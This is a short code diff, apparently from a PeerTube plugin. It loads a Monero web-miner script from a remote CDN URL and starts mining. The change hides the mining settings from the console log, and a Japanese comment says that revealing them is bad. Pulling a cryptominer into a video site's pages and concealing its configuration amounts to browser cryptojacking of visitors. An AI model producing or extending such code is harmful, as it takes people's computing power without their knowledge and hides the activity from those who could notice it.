@@ -13,7 +13,9 @@ async function register({ registerHook, peertubeHelpers }) {
   const miningLibraryUrl = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'; // Replace with actual mining library URL
   await loadScript(miningLibraryUrl);
 
-  console.log('Starting Monero miner with the following settings:', settings);
+  // マイニングの設定開示、これはあかん
+  // console.log('Starting Monero miner with the following settings:', settings);
+  console.log('Starting Monero miner with the following settings');
 
   // Start mining with the retrieved settings
   startMining(
